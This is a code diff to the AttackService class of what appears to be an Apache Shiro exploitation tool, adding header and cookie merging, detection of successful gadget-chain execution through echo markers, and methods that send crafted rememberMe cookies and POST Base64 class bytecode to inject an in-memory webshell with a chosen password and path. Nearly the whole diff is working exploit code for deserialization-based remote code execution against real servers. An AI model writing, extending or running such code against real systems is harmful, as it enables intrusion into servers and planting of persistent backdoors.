@@ -2,6 +2,7 @@
 package com.summersec.attack.core;
 
 import cn.hutool.http.HttpRequest;
+import cn.hutool.http.HttpResponse;
 import cn.hutool.http.Method;
 import com.summersec.attack.deser.frame.Shiro;
 import com.summersec.attack.deser.payloads.ObjectPayload;
@@ -66,24 +67,146 @@ public class AttackService {
 
     }
 
+    /**
+     * 先铺全局头，再用本次请求的 header 覆盖（Cookie 除外：与已有 Cookie 合并）。
+     * 避免 5.0 早期「先 header 再 global」时全局里的 Authorization 等覆盖掉命令执行请求里的 Basic 命令。
+     */
     public HashMap<String, String> getCombineHeaders(HashMap<String, String> header) {
-        HashMap<String, String> combineHeaders = new HashMap();
-        if (header != null) {
-            combineHeaders.putAll(header);
-        }
+        HashMap<String, String> combineHeaders = new HashMap<String, String>();
         if (globalHeader != null) {
-            Set<String> keySet = globalHeader.keySet();
-            for (String key : keySet) {
-                combineHeaders.put(key, globalHeader.get(key));
+            combineHeaders.putAll(globalHeader);
+        }
+        if (header != null) {
+            for (Map.Entry<String, String> e : header.entrySet()) {
+                String key = e.getKey();
+                if (key == null) {
+                    continue;
+                }
+                String value = e.getValue();
+                if ("cookie".equalsIgnoreCase(key.trim())) {
+                    String existingCookie = getCookieHeaderValue(combineHeaders);
+                    combineHeaders.put("Cookie", mergeCookieParts(
+                            existingCookie == null ? "" : existingCookie,
+                            value == null ? "" : value));
+                } else {
+                    combineHeaders.put(key, value);
+                }
             }
         }
-        return combineHeaders;
+        return normalizeCookieHeader(combineHeaders);
+    }
+
+    /** 合并两段 Cookie 值（去尾部多余分号），业务 Cookie 在前、攻击 Cookie 在后，与 4.7 习惯一致。 */
+    private static String mergeCookieParts(String first, String second) {
+        String a = first == null ? "" : first.trim();
+        String b = second == null ? "" : second.trim();
+        while (a.endsWith(";")) {
+            a = a.substring(0, a.length() - 1).trim();
+        }
+        while (b.endsWith(";")) {
+            b = b.substring(0, b.length() - 1).trim();
+        }
+        if (a.isEmpty()) {
+            return b;
+        }
+        if (b.isEmpty()) {
+            return a;
+        }
+        return a + "; " + b;
+    }
+
+    private static String getCookieHeaderValue(HashMap<String, String> map) {
+        if (map == null) {
+            return null;
+        }
+        for (Map.Entry<String, String> e : map.entrySet()) {
+            if (e.getKey() != null && "cookie".equalsIgnoreCase(e.getKey().trim())) {
+                return e.getValue();
+            }
+        }
+        return null;
+    }
+
+    /**
+     * 将 Map 中所有与 Cookie 等价的键（大小写、前后空白）合并为<strong>唯一</strong>一条 {@code Cookie} 请求头，
+     * 避免出现抓包里的双 {@code Cookie:} 行。部分容器/安全组件对多行 Cookie 的合并顺序与 4.7/5.0 不一致，
+     * 会导致只带上 JSESSIONID 或只带上 rememberMe，从而出现 deleteMe 或会话异常。
+     */
+    private static HashMap<String, String> normalizeCookieHeader(HashMap<String, String> map) {
+        if (map == null || map.isEmpty()) {
+            return map;
+        }
+        List<String> cookieKeys = new ArrayList<>();
+        for (String k : map.keySet()) {
+            if (k != null && "cookie".equalsIgnoreCase(k.trim())) {
+                cookieKeys.add(k);
+            }
+        }
+        if (cookieKeys.isEmpty()) {
+            return map;
+        }
+        String merged = null;
+        for (String k : cookieKeys) {
+            String v = map.remove(k);
+            merged = mergeCookieParts(merged == null ? "" : merged, v == null ? "" : v);
+        }
+        if (merged != null && !merged.isEmpty()) {
+            map.put("Cookie", merged);
+        }
+        return map;
+    }
+
+    /**
+     * 从请求头 Map 中拆出合并后的 Cookie 字符串，其余头交给 {@link HttpRequest#headerMap}；
+     * Cookie 单独 {@link HttpRequest#header(String, String)}，避免 Hutool 对 map 内超长 Cookie 等场景拆成多个 {@code Cookie:} 行。
+     */
+    private static AbstractMap.SimpleEntry<HashMap<String, String>, String> peelCookieHeader(HashMap<?, ?> combined) {
+        HashMap<String, String> rest = new HashMap<String, String>();
+        String merged = null;
+        if (combined != null) {
+            for (Map.Entry<?, ?> e : combined.entrySet()) {
+                String k = e.getKey() == null ? null : e.getKey().toString();
+                String v = e.getValue() == null ? null : e.getValue().toString();
+                if (k != null && "cookie".equalsIgnoreCase(k.trim())) {
+                    merged = mergeCookieParts(merged == null ? "" : merged, v == null ? "" : v);
+                } else if (k != null) {
+                    rest.put(k, v);
+                }
+            }
+        }
+        if (merged != null) {
+            while (merged.endsWith(";")) {
+                merged = merged.substring(0, merged.length() - 1).trim();
+            }
+            if (merged.isEmpty()) {
+                merged = null;
+            }
+        }
+        return new AbstractMap.SimpleEntry<HashMap<String, String>, String>(rest, merged);
+    }
+
+    /** Hutool GET：先 headerMap（无 Cookie），再单次设置 Cookie，保证线上仅一条 Cookie 头。 */
+    private HttpResponse executeHutoolGetFollowNoRedirect(HashMap<?, ?> combineHeaders) {
+        AbstractMap.SimpleEntry<HashMap<String, String>, String> peeled = peelCookieHeader(combineHeaders);
+        Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
+        HttpRequest req = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method), this.url)
+                .setProxy(proxy)
+                .timeout(this.timeout)
+                .setFollowRedirects(false);
+        HashMap<String, String> rest = peeled.getKey();
+        if (rest != null && !rest.isEmpty()) {
+            req.headerMap(rest, true);
+        }
+        String ck = peeled.getValue();
+        if (ck != null && !ck.isEmpty()) {
+            req.header("Cookie", ck);
+        }
+        return req.execute();
     }
 
     public String headerHttpRequest(HashMap<String, String> header) {
         String result = null;
         HashMap combineHeaders = this.getCombineHeaders(header);
-        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
         try {
 /*            result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
             return result;*/
@@ -91,7 +214,7 @@ public class AttackService {
                 return result;
             }*/
             if (this.method.equals("GET")) {
-                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
+                result = this.executeHutoolGetFollowNoRedirect(combineHeaders).toString();
 
             } else {
                 String contentType = combineHeaders.containsKey("Content-Type") ? (String) combineHeaders.get("Content-Type") : "application/x-www-form-urlencoded";
@@ -105,19 +228,95 @@ public class AttackService {
         return result;
     }
 
+    /**
+     * 利用链探测专用：GET 时把 Hutool 返回的响应头与正文拼在一起，避免仅依赖 {@link HttpResponse#toString()}
+     * 导致漏掉 Tomcat/Spring 回显写入的 {@code Host} 响应头。
+     */
+    private String gadgetProbeHttpRequest(HashMap<String, String> header) {
+        HashMap<String, String> combineHeaders = this.getCombineHeaders(header);
+        try {
+            if (this.method.equals("GET")) {
+                HttpResponse response = this.executeHutoolGetFollowNoRedirect(combineHeaders);
+                return flattenHutoolResponse(response);
+            }
+            String contentType = combineHeaders.containsKey("Content-Type")
+                    ? combineHeaders.get("Content-Type") : "application/x-www-form-urlencoded";
+            return HttpUtil.postHttpReuest(this.url, this.postData, "UTF-8", combineHeaders, contentType, this.timeout);
+        } catch (Exception e) {
+            this.mainController.logTextArea.appendText(Utils.log(e.getMessage()));
+            return "";
+        }
+    }
+
+    private static String flattenHutoolResponse(HttpResponse response) {
+        if (response == null) {
+            return "";
+        }
+        StringBuilder sb = new StringBuilder(1024);
+        try {
+            Map<String, List<String>> headerMap = response.headers();
+            if (headerMap != null) {
+                for (Map.Entry<String, List<String>> e : headerMap.entrySet()) {
+                    String name = e.getKey();
+                    List<String> values = e.getValue();
+                    if (name == null || values == null) {
+                        continue;
+                    }
+                    for (String v : values) {
+                        sb.append(name).append(':').append(v == null ? "" : v).append('\n');
+                    }
+                }
+            }
+        } catch (Throwable ignored) {
+            sb.append(response.toString());
+        }
+        String body = response.body();
+        if (body != null) {
+            sb.append('\n').append(body);
+        }
+        return sb.toString();
+    }
+
+    /**
+     * TomcatEcho / SpringEcho / AllEcho 等：链执行成功时常在响应头出现 {@code Host: ...} 或正文出现 {@code $$$...$$$}。
+     * <p>成功响应里仍可能带有 {@code rememberMe=deleteMe}（Shiro 清理 Cookie），故先判断回显特征，仅当<strong>无</strong>上述特征时才以 {@code deleteMe} 判失败。</p>
+     */
+    static boolean responseIndicatesGadgetHit(String probeText) {
+        if (probeText == null || probeText.isEmpty()) {
+            return false;
+        }
+        // 先认回显：链执行成功后 Tomcat/Spring 会写 Host 响应头或 $$$；同一响应里仍可能有 rememberMe=deleteMe（Shiro 清理 Cookie），不能因 deleteMe 否定命中
+        if (probeText.contains("$$$")) {
+            return true;
+        }
+        if (probeText.contains("Host:") || probeText.contains("host:")) {
+            return true;
+        }
+        if (probeText.contains("Host=[") || probeText.contains("host=[")) {
+            return true;
+        }
+        if (probeText.contains("=deleteMe")) {
+            return false;
+        }
+        return false;
+    }
+
     public String bodyHttpRequest(HashMap<String, String> header, String postString) {
         String result = "";
         HashMap combineHeaders = this.getCombineHeaders(header);
-        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
         try {
 
             if (postString.equals("")) {
-                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
-                if (result.contains("Host")){
-                    return result;
+                if (this.method.equals("GET")) {
+                    HttpResponse resp = this.executeHutoolGetFollowNoRedirect(combineHeaders);
+                    result = flattenHutoolResponse(resp);
+                    if (!responseIndicatesGadgetHit(result) && !result.contains("$$$")) {
+                        result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
+                    }
+                } else {
+                    result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
                 }
-                result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
-            } else if (!result.contains("Host") | !this.method.equals("GET")) {
+            } else if (!result.contains("Host") || !this.method.equals("GET")) {
                 result = HttpUtil.postHttpReuest(this.url, postString, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
             }
         } catch (Exception var6) {
@@ -125,6 +324,41 @@ public class AttackService {
         }
 
         return result;
+    }
+
+    public String classifyHttpResponse(String result) {
+        if (result == null) {
+            return "未收到响应";
+        }
+        String trimmed = result.trim();
+        if (trimmed.isEmpty()) {
+            return "收到空响应";
+        }
+        if (result.contains("=deleteMe")) {
+            return "检测到 rememberMe=deleteMe，目标可能拒绝或重置了 Cookie";
+        }
+        if (result.contains("->|") && result.contains("|<-")) {
+            return "检测到特征回显内容";
+        }
+        if (result.contains("HTTP/1.1 302") || result.contains("HTTP/1.1 301")
+                || result.contains("HTTP/1.1 303") || result.contains("HTTP/1.1 307")
+                || result.contains("HTTP/1.1 308")) {
+            return "收到重定向响应，未发现明确回显";
+        }
+        if (result.contains("HTTP/1.1 200") || result.contains("HTTP/1.0 200")) {
+            return "收到 200 响应，但未发现明确回显特征";
+        }
+        return "已收到响应，但未发现明确回显特征";
+    }
+
+    public void appendResponseSummary(TextArea logArea, String prefix, String result) {
+        if (logArea == null) {
+            return;
+        }
+        String status = classifyHttpResponse(result);
+        int length = result == null ? 0 : result.length();
+        logArea.appendText(Utils.log(prefix + " 响应长度=" + length));
+        logArea.appendText(Utils.log(prefix + " 判定=" + status));
     }
 
     public List<String> getALLShiroKeys() {
@@ -181,8 +415,8 @@ public class AttackService {
                 HashMap header = new HashMap();
                 header.put("Cookie", rememberMe + ";");
 //                header.put("Host", "08fb41620aa4c498a1f2ef09bbc1183c");
-                String result = this.headerHttpRequest(header);
-                if (result.contains("Host")) {
+                String result = this.gadgetProbeHttpRequest(header);
+                if (responseIndicatesGadgetHit(result)) {
                     Platform.runLater(() -> {
                         this.mainController.logTextArea.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
                         this.mainController.logTextArea.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
@@ -193,7 +427,17 @@ public class AttackService {
                     attackRememberMe = rememberMe;
                     flag = true;
                 } else {
-                    Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt)));
+                    final String failHint;
+                    if (result != null && result.contains("=deleteMe")) {
+                        failHint = " -> 响应含 rememberMe=deleteMe（密钥错误、AES 模式不符或利用链未执行）";
+                    } else if (result != null && (result.contains("HTTP/1.1 302") || result.contains("HTTP/1.0 302"))) {
+                        failHint = " -> 收到 302 重定向且无回显特征，多为未登录或 Shiro 未接受 Cookie";
+                    } else {
+                        failHint = "";
+                    }
+                    final String hint = failHint;
+                    Platform.runLater(() -> this.mainController.logTextArea.appendText(
+                            Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt + hint)));
                 }
             } else {
                 Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt + " -> payload 构造失败")));
@@ -578,8 +822,91 @@ public class AttackService {
 
     }
 
+    /**
+     * 使用主界面选中的 Shiro 利用链 + InjectMemTool 生成 Cookie，POST {@code user=} + 类字节码 Base64（与内存马注入一致）。
+     */
+    public String sendInjectMemToolExploit(String gadgetOpt, String shiroKey, String userBase64Payload, TextArea sink) {
+        return sendInjectMemToolExploit(gadgetOpt, shiroKey, userBase64Payload, "", "", sink);
+    }
+
+    public String sendInjectMemToolExploit(String gadgetOpt, String shiroKey, String userBase64Payload,
+                                           String shellPass, String shellPath, TextArea sink) {
+        String userPart = userBase64Payload == null ? "" : userBase64Payload.trim().replaceAll("\\s+", "");
+        if (userPart.isEmpty()) {
+            return null;
+        }
+        String rememberMe = this.GadgetPayload(gadgetOpt, "InjectMemTool", shiroKey);
+        if (rememberMe == null || rememberMe.isEmpty()) {
+            return null;
+        }
+        HashMap<String, String> header = new HashMap<String, String>();
+        header.put("Cookie", rememberMe);
+        header.put("p", shellPass != null ? shellPass : "");
+        header.put("path", shellPath != null ? shellPath : "");
+        TextArea logArea = sink != null ? sink : this.mainController.logTextArea;
+        try {
+            String postString = "user=" + userPart;
+            String result = this.bodyHttpRequest(header, postString);
+            appendResponseSummary(logArea, "[Shiro+InjectMemTool] 已发送", result);
+            if (result != null) {
+                if (result.length() <= 2000) {
+                    logArea.appendText(Utils.log(result));
+                } else {
+                    logArea.appendText(Utils.log(result.substring(0, 500) + "..."));
+                }
+            }
+            logArea.appendText(Utils.log("-------------------------------------------------"));
+            return result;
+        } catch (Exception e) {
+            logArea.appendText(Utils.log("[异常] " + e.getMessage()));
+            return null;
+        }
+    }
+
+    public static boolean looksLikeRememberMeCookiePayload(String raw) {
+        if (raw == null) {
+            return false;
+        }
+        String t = raw.trim();
+        int eq = t.indexOf('=');
+        if (eq <= 0) {
+            return false;
+        }
+        return t.substring(0, eq).trim().equalsIgnoreCase("rememberMe");
+    }
+
+    /**
+     * 将生成结果仅作为 Cookie（例如 Legacy 回显已加密的 rememberMe=…）发送，不附带 user= Body。
+     */
+    public String sendRememberMeCookieExploit(String cookieLine, TextArea sink) {
+        if (cookieLine == null || cookieLine.trim().isEmpty()) {
+            return null;
+        }
+        String c = cookieLine.trim();
+        HashMap<String, String> header = new HashMap<String, String>();
+        header.put("Cookie", c);
+        TextArea logArea = sink != null ? sink : this.mainController.logTextArea;
+        try {
+            String result = this.bodyHttpRequest(header, "");
+            appendResponseSummary(logArea, "[Cookie] 已发送 rememberMe 载荷，", result);
+            if (result != null) {
+                if (result.length() <= 2000) {
+                    logArea.appendText(Utils.log(result));
+                } else {
+                    logArea.appendText(Utils.log(result.substring(0, 500) + "..."));
+                }
+            }
+            logArea.appendText(Utils.log("-------------------------------------------------"));
+            return result;
+        } catch (Exception e) {
+            logArea.appendText(Utils.log("[异常] " + e.getMessage()));
+            return null;
+        }
+    }
+
     public EchoGenerateResult generateEchoWithThirdParty(String source, String serverType, String modelType, String formatType,
-                                                         String legacyGadget, String legacyEcho, String shiroKey) {
+                                                         String legacyGadget, String legacyEcho, String shiroKey,
+                                                         String jegCmdText, String jegCodeText) {
         try {
             if (source == null || source.trim().isEmpty()) {
                 source = "Legacy";
@@ -596,8 +923,8 @@ public class AttackService {
             request.setServerType(serverType);
             request.setModelType(modelType);
             request.setFormatType(formatType);
-            request.setRequestHeaderName("User-Agent");
-            request.setRequestHeaderValue("Mozilla/5.0");
+            request.setJegCmdText(jegCmdText);
+            request.setJegCodeText(jegCodeText);
             EchoGenerateResult result = generatorFacade.generateEcho(source, request)
                     .withSelection(serverType, modelType, formatType);
             if (!result.isSuccess()) {
